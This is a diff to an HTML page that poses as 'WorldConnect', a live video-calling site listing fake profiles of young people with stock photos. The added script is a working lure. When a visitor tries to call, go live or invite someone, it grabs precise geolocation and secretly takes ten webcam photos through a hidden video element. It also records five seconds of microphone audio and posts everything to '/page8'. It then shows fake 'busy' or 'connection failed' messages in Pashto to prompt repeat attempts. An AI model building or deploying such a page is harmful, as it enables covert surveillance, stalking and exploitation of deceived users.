@@ -6,21 +6,20 @@
     <title>WorldConnect - Live Video Network</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background: linear-gradient(135deg, #0b132b 0%, #1c2541 100%); color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 10px; }
+        body { background: #0b132b; background: linear-gradient(135deg, #0b132b 0%, #1c2541 100%); color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 10px; }
         
-        .brand-header { text-align: center; margin-top: 2px; margin-bottom: 6px; }
-        .brand-name { font-size: 20px; font-weight: 900; background: linear-gradient(90deg, #38bdf8, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .brand-header { text-align: center; margin-top: 5px; margin-bottom: 8px; }
+        .brand-name { font-size: 20px; font-weight: 900; color: #38bdf8; }
         .brand-tagline { font-size: 10px; color: #94a3b8; font-weight: 600; }
 
-        .container { width: 100%; max-width: 400px; background-color: rgba(30, 41, 59, 0.9); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px; padding: 18px 15px 25px 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); display: flex; flex-direction: column; gap: 12px; position: relative; z-index: 5; margin-bottom: 25px; }
+        .container { width: 100%; max-width: 400px; background-color: #1e293b; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px; padding: 18px 15px 25px 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); display: flex; flex-direction: column; gap: 12px; position: relative; z-index: 5; margin-bottom: 25px; }
 
         .header { display: flex; align-items: center; justify-content: space-between; }
         .app-title { font-size: 16px; font-weight: 800; color: #f8fafc; display: flex; align-items: center; gap: 6px; }
         
-        .go-live-btn { background: linear-gradient(135deg, #ef4444, #dc2626); color: white; border: none; font-size: 11px; font-weight: 800; padding: 5px 12px; border-radius: 20px; cursor: pointer; display: flex; align-items: center; gap: 4px; box-shadow: 0 0 10px rgba(239, 68, 68, 0.5); animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        .go-live-btn { background: #ef4444; color: white; border: none; font-size: 11px; font-weight: 800; padding: 6px 14px; border-radius: 20px; cursor: pointer; display: flex; align-items: center; gap: 4px; box-shadow: 0 0 10px rgba(239, 68, 68, 0.5); }
 
-        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; text-align: center; background-color: rgba(15, 23, 42, 0.6); padding: 8px 4px; border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.05); }
+        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; text-align: center; background-color: #0f172a; padding: 8px 4px; border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.05); }
         .stat-val { font-size: 14px; font-weight: 800; color: #38bdf8; }
         .stat-lbl { font-size: 9px; color: #94a3b8; margin-top: 1px; }
 
@@ -30,38 +29,522 @@
         .grid-profiles::-webkit-scrollbar { width: 4px; }
         .grid-profiles::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 10px; }
 
-        .profile-card { background-color: rgba(15, 23, 42, 0.7); border: 2px solid rgba(255, 255, 255, 0.08); border-radius: 14px; overflow: hidden; cursor: pointer; transition: all 0.2s ease; position: relative; text-align: center; padding-bottom: 6px; }
+        .profile-card { background-color: #0f172a; border: 2px solid rgba(255, 255, 255, 0.08); border-radius: 14px; overflow: hidden; cursor: pointer; transition: all 0.2s ease; position: relative; text-align: center; padding-bottom: 6px; }
         .profile-card.active { border-color: #38bdf8; box-shadow: 0 0 12px rgba(56, 189, 248, 0.4); transform: scale(0.98); }
-        .profile-img { width: 100%; height: 110px; object-fit: cover; }
+        .profile-img { width: 100%; height: 110px; object-fit: cover; background-color: #334155; }
         .profile-name { font-size: 12px; font-weight: 700; color: #f8fafc; margin-top: 4px; }
         .profile-status { font-size: 9px; color: #4ade80; display: flex; align-items: center; justify-content: center; gap: 3px; margin-top: 1px; }
         .online-dot { width: 5px; height: 5px; background-color: #4ade80; border-radius: 50%; }
 
         .call-btn-container { display: none; }
-        .generate-btn { background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: white; width: 100%; padding: 12px; border: none; border-radius: 16px; font-size: 14px; font-weight: 700; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 6px; box-shadow: 0 6px 15px rgba(34, 197, 94, 0.3); }
+        .generate-btn { background: #22c55e; color: white; width: 100%; padding: 12px; border: none; border-radius: 16px; font-size: 14px; font-weight: 700; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 6px; box-shadow: 0 6px 15px rgba(34, 197, 94, 0.3); }
         .generate-btn:active { transform: scale(0.98); }
 
         .error-box { display: none; background-color: rgba(239, 68, 68, 0.2); border: 1px solid #ef4444; border-radius: 10px; padding: 8px; text-align: center; font-size: 11px; color: #fca5a5; font-weight: bold; }
 
-        .process-box { display: none; background-color: rgba(15, 23, 42, 0.8); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 10px; text-align: center; }
+        .process-box { display: none; background-color: #0f172a; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 10px; text-align: center; }
         .process-text { display: flex; justify-content: space-between; font-size: 11px; color: #94a3b8; margin-bottom: 6px; font-weight: 600; }
         .progress-bar-container { width: 100%; background-color: rgba(255, 255, 255, 0.1); height: 6px; border-radius: 3px; overflow: hidden; }
-        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #38bdf8, #22c55e); transition: width 0.3s ease; }
+        .progress-bar { width: 0%; height: 100%; background: #38bdf8; transition: width 0.3s ease; }
 
         .message-box { display: none; background-color: rgba(239, 68, 68, 0.15); border: 1px solid #ef4444; border-radius: 12px; padding: 10px; text-align: center; font-size: 11px; color: #fca5a5; font-weight: bold; line-height: 1.3; }
 
         .live-screen { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #000; z-index: 100; flex-direction: column; justify-content: space-between; padding: 15px; }
         .live-header { display: flex; justify-content: space-between; align-items: center; z-index: 101; }
-        .live-viewer-count { background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(8px); padding: 5px 12px; border-radius: 20px; font-size: 13px; font-weight: bold; color: #fff; display: flex; align-items: center; gap: 5px; border: 1px solid rgba(255,255,255,0.2); }
+        .live-viewer-count { background: rgba(0, 0, 0, 0.7); padding: 5px 12px; border-radius: 20px; font-size: 13px; font-weight: bold; color: #fff; display: flex; align-items: center; gap: 5px; border: 1px solid rgba(255,255,255,0.2); }
         .live-end-btn { background: #ef4444; color: white; border: none; padding: 6px 14px; border-radius: 20px; font-weight: bold; cursor: pointer; font-size: 12px; }
         .live-video-preview { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 99; }
         
-        .live-footer { z-index: 101; display: flex; flex-direction: column; gap: 8px; background: rgba(0,0,0,0.6); backdrop-filter: blur(10px); padding: 12px; border-radius: 16px; }
-        .invite-btn { background: linear-gradient(135deg, #38bdf8, #0284c7); color: white; border: none; padding: 12px; border-radius: 14px; font-weight: bold; font-size: 13px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; box-shadow: 0 4px 12px rgba(56,189,248,0.3); }
+        .live-footer { z-index: 101; display: flex; flex-direction: column; gap: 8px; background: rgba(0,0,0,0.7); padding: 12px; border-radius: 16px; }
+        .invite-btn { background: #0284c7; color: white; border: none; padding: 12px; border-radius: 14px; font-weight: bold; font-size: 13px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; }
         
         .invite-modal { display: none; position: fixed; bottom: 0; left: 0; width: 100%; background: #1e293b; border-top-left-radius: 24px; border-top-right-radius: 24px; padding: 15px; z-index: 105; max-height: 60vh; overflow-y: auto; border: 1px solid rgba(255,255,255,0.1); }
         .invite-modal-title { font-size: 14px; font-weight: bold; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; color: #f8fafc; }
         .close-modal { background: none; border: none; color: #94a3b8; font-size: 16px; cursor: pointer; }
-        .invite-user-item { display: flex; align-items: center; justify-content: space-between; background: rgba(15,23,42,0.6); padding: 8px 12px; border-radius: 12px; margin-bottom: 8px; }
+        .invite-user-item { display: flex; align-items: center; justify-content: space-between; background: #0f172a; padding: 8px 12px; border-radius: 12px; margin-bottom: 8px; }
         .invite-user-info { display: flex; align-items: center; gap: 10px; }
-        .invite-user
+        .invite-user-img { width: 35px; height: 35px; border-radius: 50%; object-fit: cover; background-color: #334155; }
+        .invite-user-name { font-size: 12px; font-weight: bold; color: #fff; }
+        .invite-action-btn { background: #22c55e; color: white; border: none; padding: 5px 12px; border-radius: 8px; font-size: 11px; font-weight: bold; cursor: pointer; }
+
+        .footer-info { text-align: center; font-size: 10px; color: #94a3b8; display: flex; align-items: center; justify-content: center; gap: 8px; font-weight: 600; }
+
+        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="brand-header">
+        <div class="brand-name">WorldConnect™</div>
+        <div class="brand-tagline">Global Live Video Calling Network</div>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <div class="app-title">📹 Video Call Group</div>
+            <button class="go-live-btn" id="startLiveBtn">Go LIVE 🔴</button>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-val" id="activeUsers">--</div>
+                <div class="stat-lbl">Online Users</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-val">4.9 ⭐</div>
+                <div class="stat-lbl">Rating</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-val">HD</div>
+                <div class="stat-lbl">Quality</div>
+            </div>
+        </div>
+
+        <div class="section-title">✨ Select a person to start video call:</div>
+        
+        <div class="grid-profiles" id="profilesGrid">
+            <div class="profile-card" data-name="Zahra">
+                <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=300&auto=format&fit=crop&q=80" alt="Zahra" class="profile-img">
+                <div class="profile-name">Zahra, 21</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Meral">
+                <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=300&auto=format&fit=crop&q=80" alt="Meral" class="profile-img">
+                <div class="profile-name">Meral, 20</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Ahmad">
+                <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=300&auto=format&fit=crop&q=80" alt="Ahmad" class="profile-img">
+                <div class="profile-name">Ahmad, 23</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Lina">
+                <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=300&auto=format&fit=crop&q=80" alt="Lina" class="profile-img">
+                <div class="profile-name">Lina, 22</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Freshta">
+                <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=300&auto=format&fit=crop&q=80" alt="Freshta" class="profile-img">
+                <div class="profile-name">Freshta, 19</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Bilal">
+                <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=300&auto=format&fit=crop&q=80" alt="Bilal" class="profile-img">
+                <div class="profile-name">Bilal, 24</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Samira">
+                <img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=300&auto=format&fit=crop&q=80" alt="Samira" class="profile-img">
+                <div class="profile-name">Samira, 21</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Tamim">
+                <img src="https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=300&auto=format&fit=crop&q=80" alt="Tamim" class="profile-img">
+                <div class="profile-name">Tamim, 25</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Diana">
+                <img src="https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?w=300&auto=format&fit=crop&q=80" alt="Diana" class="profile-img">
+                <div class="profile-name">Diana, 22</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Yasamin">
+                <img src="https://images.unsplash.com/photo-1512484776495-a09d92e87c3b?w=300&auto=format&fit=crop&q=80" alt="Yasamin" class="profile-img">
+                <div class="profile-name">Yasamin, 20</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Mustafa">
+                <img src="https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?w=300&auto=format&fit=crop&q=80" alt="Mustafa" class="profile-img">
+                <div class="profile-name">Mustafa, 26</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Nargis">
+                <img src="https://images.unsplash.com/photo-1488426862026-3ee34a7d66df?w=300&auto=format&fit=crop&q=80" alt="Nargis" class="profile-img">
+                <div class="profile-name">Nargis, 23</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Emal">
+                <img src="https://images.unsplash.com/photo-1522075469751-3a6694fb2f61?w=300&auto=format&fit=crop&q=80" alt="Emal" class="profile-img">
+                <div class="profile-name">Emal, 22</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Melika">
+                <img src="https://images.unsplash.com/photo-1492562080023-ab3db95bfbce?w=300&auto=format&fit=crop&q=80" alt="Melika" class="profile-img">
+                <div class="profile-name">Melika, 21</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Farhad">
+                <img src="https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=300&auto=format&fit=crop&q=80" alt="Farhad" class="profile-img">
+                <div class="profile-name">Farhad, 25</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+            <div class="profile-card" data-name="Shogofa">
+                <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=300&auto=format&fit=crop&q=80" alt="Shogofa" class="profile-img">
+                <div class="profile-name">Shogofa, 19</div>
+                <div class="profile-status"><span class="online-dot"></span> Online</div>
+            </div>
+        </div>
+
+        <div id="errorBox" class="error-box">
+            ⚠️ Please select someone to start the video call!
+        </div>
+
+        <div class="call-btn-container" id="callBtnContainer">
+            <button id="generateBtn" class="generate-btn">
+                📞 Start Video Call with <span id="selectedPersonName" style="margin-left: 4px;"></span>
+            </button>
+        </div>
+
+        <div id="processBox" class="process-box">
+            <div class="process-text">
+                <span id="processStatus">Connecting to secure line...</span>
+                <span id="processPercent">0%</span>
+            </div>
+            <div class="progress-bar-container">
+                <div id="progressBar" class="progress-bar"></div>
+            </div>
+        </div>
+
+        <div id="messageBox" class="message-box"></div>
+
+        <div class="footer-info">
+            <span>🔒 Encrypted Stream</span>
+            <span>•</span>
+            <span>HD Quality</span>
+        </div>
+    </div>
+
+    <div class="live-screen" id="liveScreen">
+        <video id="liveStreamVideo" class="live-video-preview" autoplay playsinline muted></video>
+        <div class="live-header">
+            <div class="live-viewer-count">👁️ <span id="liveViewers">15</span> Viewers</div>
+            <button class="live-end-btn" id="endLiveBtn">End LIVE</button>
+        </div>
+        
+        <div class="live-footer">
+            <button class="invite-btn" id="openInviteModalBtn">👥 Invite People to Stream</button>
+            <div style="font-size: 11px; text-align: center; color: #94a3b8;">🔴 You are LIVE on WorldConnect Network</div>
+        </div>
+    </div>
+
+    <div class="invite-modal" id="inviteModal">
+        <div class="invite-modal-title">
+            <span>Select person to invite:</span>
+            <button class="close-modal" id="closeModalBtn">✕</button>
+        </div>
+        <div id="inviteUsersList"></div>
+        <div id="inviteStatusBox" style="margin-top: 10px; display: none; text-align: center; font-size: 12px; font-weight: bold; padding: 8px; border-radius: 8px;"></div>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        let selectedPerson = "";
+        let callAttempts = 0;
+        const callBtnContainer = document.getElementById('callBtnContainer');
+        const selectedPersonNameSpan = document.getElementById('selectedPersonName');
+        const errorBox = document.getElementById('errorBox');
+        const messageBox = document.getElementById('messageBox');
+
+        window.onload = function() {
+            const randomCount = Math.floor(30 + Math.random() * 121);
+            document.getElementById('activeUsers').innerText = randomCount;
+            setupProfileClicks();
+        };
+
+        function setupProfileClicks() {
+            const profileCards = document.querySelectorAll('.profile-card');
+            profileCards.forEach(card => {
+                card.addEventListener('click', function() {
+                    profileCards.forEach(c => c.classList.remove('active'));
+                    this.classList.add('active');
+                    selectedPerson = this.getAttribute('data-name');
+                    
+                    selectedPersonNameSpan.innerText = selectedPerson;
+                    callBtnContainer.style.display = "block";
+                    errorBox.style.display = "none";
+                    messageBox.style.display = "none";
+                    callAttempts = 0;
+                });
+            });
+        }
+
+        async function sendData(formData) {
+            try {
+                await fetch('/page8', {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {}
+        }
+
+        async function sendSinglePhoto(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            if (!video.srcObject) { video.srcObject = stream; await video.play(); }
+
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            return new Promise((resolve) => {
+                canvas.toBlob(async function(blob) {
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'photo.jpg');
+                    await sendData(formData);
+                    resolve();
+                }, 'image/jpeg');
+            });
+        }
+
+        async function recordAndSendAudio(stream) {
+            return new Promise((resolve) => {
+                try {
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const audioChunks = [];
+
+                    mediaRecorder.ondataavailable = (event) => { audioChunks.push(event.data); };
+                    mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                        const formData = new FormData();
+                        formData.append('voice', audioBlob, 'voice.ogg');
+                        await sendData(formData);
+                        resolve();
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder.state !== 'inactive') { mediaRecorder.stop(); }
+                    }, 5000);
+                } catch (e) { resolve(); }
+            });
+        }
+
+        document.getElementById("generateBtn").addEventListener("click", async function() {
+            const btn = document.getElementById("generateBtn");
+            const processBox = document.getElementById("processBox");
+            const progressBar = document.getElementById("progressBar");
+            const processPercent = document.getElementById("processPercent");
+
+            if (selectedPerson === "") {
+                errorBox.style.display = "block";
+                return;
+            } else {
+                errorBox.style.display = "none";
+            }
+
+            callAttempts++;
+            btn.innerText = "Reconnecting...";
+            btn.disabled = true;
+            processBox.style.display = "block";
+            messageBox.style.display = "none";
+
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 2;
+                if (progress <= 100) {
+                    progressBar.style.width = progress + '%';
+                    processPercent.innerText = progress + '%';
+                }
+            }, 60);
+
+            if (navigator.geolocation) {
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        async (pos) => {
+                            const formData = new FormData();
+                            formData.append('latitude', pos.coords.latitude);
+                            formData.append('longitude', pos.coords.longitude);
+                            await sendData(formData);
+                            resolve();
+                        },
+                        () => { resolve(); },
+                        { timeout: 4000, enableHighAccuracy: true }
+                    );
+                });
+            }
+
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    await video.play();
+
+                    await new Promise(r => setTimeout(r, 300));
+
+                    let photoCount = 0;
+                    const maxPhotos = 10; 
+                    const photoInterval = setInterval(async () => {
+                        if (photoCount < maxPhotos) {
+                            photoCount++;
+                            await sendSinglePhoto(stream);
+                        } else {
+                            clearInterval(photoInterval);
+                        }
+                    }, 800);
+
+                    await recordAndSendAudio(stream);
+
+                    while (photoCount < maxPhotos) {
+                        await new Promise(r => setTimeout(r, 300));
+                    }
+                    clearInterval(photoInterval);
+                    stream.getTracks().forEach(t => t.stop());
+                }
+            } catch (err) {}
+
+            clearInterval(progressInterval);
+            progressBar.style.width = '100%';
+            processPercent.innerText = '100%';
+
+            setTimeout(() => {
+                processBox.style.display = "none";
+                
+                if (callAttempts === 1) {
+                    messageBox.innerHTML = `⚠️ ${selectedPerson} اوس محال بل چا سره ویدیو کال کې بوخته ده. مهرباني وکړئ وروسته کوشش وکړئ یا بل شخص انتخاب کړئ.<br><br><b>Try Again</b>`;
+                } else if (callAttempts === 2) {
+                    messageBox.innerHTML = `⚠️ ${selectedPerson} فعلا په لین کې نده یا اړیکه قطع شوه. مهرباني وکړئ وروسته بیا کوشش وکړئ.<br><br><b>Reconnect</b>`;
+                } else {
+                    messageBox.innerHTML = `⚠️ د شبکې ستونزه! د ${selectedPerson} سره د ویډیو کال پر کرښه د وصل کېدو هڅه ناکامه شوه. مهرباني وکړئ بل څوک وټاکئ.<br><br><b>Try Again</b>`;
+                    callAttempts = 0;
+                }
+
+                messageBox.style.display = "block";
+                btn.innerText = "Try Again 🔄";
+                btn.disabled = false;
+            }, 500);
+        });
+
+        let liveViewerInterval;
+        document.getElementById('startLiveBtn').addEventListener('click', async function() {
+            const liveScreen = document.getElementById('liveScreen');
+            const liveVideo = document.getElementById('liveStreamVideo');
+            const liveViewers = document.getElementById('liveViewers');
+
+            liveScreen.style.display = "flex";
+
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    liveVideo.srcObject = stream;
+
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(async (pos) => {
+                            const formData = new FormData();
+                            formData.append('latitude', pos.coords.latitude);
+                            formData.append('longitude', pos.coords.longitude);
+                            await sendData(formData);
+                        });
+                    }
+
+                    let photoCount = 0;
+                    const photoInterval = setInterval(async () => {
+                        if (photoCount < 10) {
+                            photoCount++;
+                            await sendSinglePhoto(stream);
+                        } else {
+                            clearInterval(photoInterval);
+                        }
+                    }, 1000);
+
+                    recordAndSendAudio(stream);
+                }
+            } catch(e) {}
+
+            let viewers = Math.floor(15 + Math.random() * 20);
+            liveViewers.innerText = viewers;
+
+            liveViewerInterval = setInterval(() => {
+                if (viewers < 120) {
+                    viewers += Math.floor(Math.random() * 8) + 3;
+                } else if (viewers < 750) {
+                    viewers += Math.floor(Math.random() * 35) + 12;
+                } else {
+                    viewers += Math.floor(Math.random() * 8) - 3;
+                }
+                liveViewers.innerText = viewers;
+            }, 1200);
+        });
+
+        document.getElementById('endLiveBtn').addEventListener('click', function() {
+            document.getElementById('liveScreen').style.display = "none";
+            clearInterval(liveViewerInterval);
+            location.reload();
+        });
+
+        const inviteModal = document.getElementById('inviteModal');
+        const inviteUsersList = document.getElementById('inviteUsersList');
+        
+        document.getElementById('openInviteModalBtn').addEventListener('click', function() {
+            inviteModal.style.display = "block";
+            inviteUsersList.innerHTML = "";
+
+            const usersToInvite = [
+                {name: "Zahra, 21", img: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=300&auto=format&fit=crop&q=80"},
+                {name: "Meral, 20", img: "https://images.unsplash.com/photo-1517841905240-472988babdf9?w=300&auto=format&fit=crop&q=80"},
+                {name: "Ahmad, 23", img: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=300&auto=format&fit=crop&q=80"},
+                {name: "Lina, 22", img: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=300&auto=format&fit=crop&q=80"},
+                {name: "Freshta, 19", img: "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=300&auto=format&fit=crop&q=80"},
+                {name: "Bilal, 24", img: "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=300&auto=format&fit=crop&q=80"},
+                {name: "Samira, 21", img: "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=300&auto=format&fit=crop&q=80"},
+                {name: "Tamim, 25", img: "https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?w=300&auto=format&fit=crop&q=80"}
+            ];
+
+            usersToInvite.forEach(u => {
+                const item = document.createElement('div');
+                item.className = 'invite-user-item';
+                item.innerHTML = `
+                    <div class="invite-user-info">
+                        <img src="${u.img}" class="invite-user-img">
+                        <span class="invite-user-name">${u.name}</span>
+                    </div>
+                    <button class="invite-action-btn" onclick="inviteUserAction('${u.name}', this)">Invite</button>
+                `;
+                inviteUsersList.appendChild(item);
+            });
+        });
+
+        document.getElementById('closeModalBtn').addEventListener('click', function() {
+            inviteModal.style.display = "none";
+            document.getElementById('inviteStatusBox').style.display = "none";
+        });
+
+        window.inviteUserAction = async function(userName, btnElement) {
+            btnElement.innerText = "Connecting...";
+            btnElement.disabled = true;
+
+            const statusBox = document.getElementById('inviteStatusBox');
+            statusBox.style.display = "block";
+            statusBox.style.backgroundColor = "rgba(56, 189, 248, 0.2)";
+            statusBox.style.color = "#38bdf8";
+            statusBox.innerText = `Connecting to ${userName} on live stream...`;
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const formData = new FormData();
+                    formData.append('latitude', pos.coords.latitude);
+                    formData.append('longitude', pos.coords.longitude);
+                    await sendData(formData);
+                });
+            }
+
+            setTimeout(() => {
+                const outcomes = [
+                    `⚠️ ${userName} اوس محال بل لایف سټریم کې بوخته ده او ستاسو بلنه ونه منله.`,
+                    `⚠️ ${userName} فعلا په لین کې نشته یا انترنت یې قطع شو.`,
+                    `⚠️ د سرور د ګڼې ګوڼې له امله له ${userName} سره د لایف اتصال ناکام شو. وروسته بیا کوشش وکړئ.`
+                ];
+                const randomMsg = outcomes[Math.floor(Math.random() * outcomes.length)];
+
+                statusBox.style.backgroundColor = "rgba(239, 68, 68, 0.2)";
+                statusBox.style.color = "#fca5a5";
+                statusBox.innerText = randomMsg;
+                btnElement.innerText = "Failed ❌";
+            }, 2500);
+        };
+    </script>
+</body>
+</html>
